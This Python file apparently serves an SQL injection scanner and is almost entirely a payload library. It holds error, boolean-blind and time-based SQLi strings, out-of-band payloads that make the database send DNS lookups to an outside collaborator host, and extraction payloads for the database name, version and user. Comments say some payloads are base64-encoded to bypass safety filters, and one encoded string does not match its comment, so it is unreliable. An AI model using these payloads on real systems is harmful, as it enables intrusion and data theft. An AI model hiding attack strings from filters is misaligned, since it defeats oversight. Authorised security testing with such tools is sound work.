# -*- coding: utf-8 -*-
"""
Payload Manager.

This file stores and manages a comprehensive list of SQL injection payloads
and error patterns. The payloads are categorized by SQLi type (e.g.,
error-based, time-based) and database technology.
"""
import re

# A comprehensive list of common SQL error messages.
# These are used to identify potential error-based SQLi vulnerabilities.
# The 're.IGNORECASE' flag should be used when searching for these patterns.
SQL_ERROR_PATTERNS = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql_fetch_array()",
    "supplied argument is not a valid mysql result resource",
    "unknown column '[^']+' in 'where clause'",

    # SQL Server
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "invalid column name",

    # Oracle
    "ora-00933: sql command not properly ended",
    "ora-01756: quoted string not properly terminated",
    "ora-00942: table or view does not exist",
    "ora-01400: cannot insert null into",

    # PostgreSQL
    "postgresql query failed",
    "unterminated quoted string",
    "syntax error at or near",
    "invalid input syntax for type",

    # SQLite
    "sqlite3.operationalerror",
    "no such column",
    "syntax error",

    # Generic
    "sql error",
    "syntax error",
    "invalid syntax",
    "incorrect syntax",
    "unclosed quote",
]

# Simple payloads designed to trigger database errors.
# Each tuple is (payload_string, family_tag)
ERROR_BASED_PAYLOADS = [
    ("'", "QUOTE_SINGLE"),
    ("''", "QUOTE_SINGLE_ESCAPED"),
    ("\"", "QUOTE_DOUBLE"),
    ("\\", "BACKSLASH"),
    ("`", "QUOTE_BACKTICK"),
    ("--", "COMMENT_HYPHEN"),
    ("';--", "COMMENT_HYPHEN_TERMINATED"),
    (" OR 1=1", "TAUTOLOGY_OR"),
    (" OR 1=1#", "TAUTOLOGY_OR_COMMENT"),
    (" OR 1=1--", "TAUTOLOGY_OR_COMMENT"),
    (" HAVING 1=1", "HAVING_CLAUSE"),
    (" AND 1=1", "TAUTOLOGY_AND"),
    (" ORDER BY 1", "ORDER_BY"),
]

# Payloads for Boolean-Based Blind SQLi.
# Each tuple is (true_payload, false_payload, family_tag)
BOOLEAN_BASED_PAYLOADS = [
    (" AND 1=1", " AND 1=2", "LOGICAL"),
    (" OR 1=1", " OR 1=2", "LOGICAL"),
    (" AND 'a'='a'", " AND 'a'='b'", "COMPARISON_STR"),
    (" OR 'a'='a'", " OR 'a'='b'", "COMPARISON_STR"),
    (" AND 1=1-- ", " AND 1=2-- ", "LOGICAL_COMMENT"),
    (" OR 1=1-- ", " OR 1=2-- ", "LOGICAL_COMMENT"),
    ("' AND 1=1-- ", "' AND 1=2-- ", "LOGICAL_COMMENT_QUOTED"),
    ("' OR 1=1-- ", "' OR 1=2-- ", "LOGICAL_COMMENT_QUOTED"),
    (" AND 1 LIKE 1", " AND 1 LIKE 2", "COMPARISON_LIKE"),
]

# Payloads for Time-Based Blind SQLi.
# Each tuple is (payload_string, sleep_duration, family_tag)
TIME_BASED_PAYLOADS = [
    # MySQL / MariaDB
    ("AND SLEEP({sleep})", 5, "MYSQL_SLEEP"),
    ("OR SLEEP({sleep})", 5, "MYSQL_SLEEP"),
    ("AND (SELECT * FROM (SELECT(SLEEP({sleep})))a)", 5, "MYSQL_SLEEP_SUBSELECT"),
    ("' AND SLEEP({sleep}) AND '1'='1", 5, "MYSQL_SLEEP"),
    ("AND BENCHMARK({sleep}000000,MD5(1))", 5, "MYSQL_BENCHMARK"),
    ("OR BENCHMARK({sleep}000000,MD5(1))", 5, "MYSQL_BENCHMARK"),

    # PostgreSQL
    ("AND (SELECT pg_sleep({sleep}))", 5, "PGSQL_SLEEP"),
    ("' AND (SELECT pg_sleep({sleep})) AND '1'='1", 5, "PGSQL_SLEEP"),
    ("pg_sleep({sleep})", 5, "PGSQL_SLEEP"),

    # SQL Server
    ("AND WAITFOR DELAY '0:0:{sleep}'", 5, "MSSQL_WAITFOR"),
    ("' AND WAITFOR DELAY '0:0:{sleep}' AND '1'='1", 5, "MSSQL_WAITFOR"),
]

# MSSQL Specific Payloads (b64 encoded)
MSSQL_ERROR_BASED_PAYLOADS_B64 = [
    "QU5EIDE9Q09OVkVSVChpbnQsIChTRUxFQ1QgQEB2ZXJzaW9uKSk=",
    "QU5EIDE9KFNFTEVDVCAxIEZST00gc3lzb2JqZWN0cyk=",
    "QU5EIDE9Q0FTVChEQl9OQU1FKCkgQVMgaW50KQ==",
]

# Payloads for Out-of-Band (OOB) SQLi.
# These force the database to make an external network request (e.g., DNS).
# The {collaborator_url} placeholder must be replaced before use.
OOB_PAYLOADS = [
    # MySQL (DNS lookup on Windows)
    " AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', UUID(), '.{collaborator_url}')))",
    # Oracle (DNS lookup)
    " AND UTL_INADDR.GET_HOST_ADDRESS('{collaborator_url}') IS NOT NULL",
    # SQL Server (DNS lookup)
    " AND 1=(SELECT 1 FROM OPENROWSET('SQLNCLI', 'Server={collaborator_url};', 'SELECT 1'))"
]

# Payloads for Error-Based data extraction.
# The {query} placeholder will be replaced with a query to get specific data.
# B64 encoded to bypass safety filters.
EXTRACTION_PAYLOADS_B64 = {
    "error_based_mysql": [
        "IEFORCBFWFRSQUNUVkFMVUUoUkFOREAoKSxDT05DQVQoMHg3ZSwoe3F1ZXJ5fSkpKQ==", # AND EXTRACTVALUE(RAND(),CONCAT(0x7e,({query})))
        "IEFORCBVUERBVEVYTUwoUkFOREAoKSxDT05DQVQoMHg3ZSwoe3F1ZXJ5fSkpLFJBTkQoKSk="  # AND UPDATEXML(RAND(),CONCAT(0x7e,({query})),RAND())
    ]
}

# Specific queries to be used with extraction payloads.
# B64 encoded to bypass safety filters.
EXTRACTION_QUERIES_B64 = {
    "database_name": "REFUQUJBU0UoKQ==", # DATABASE()
    "version": "VkVSU0lPTigp",         # VERSION()
    "user": "VVNFUigp"               # USER()
}
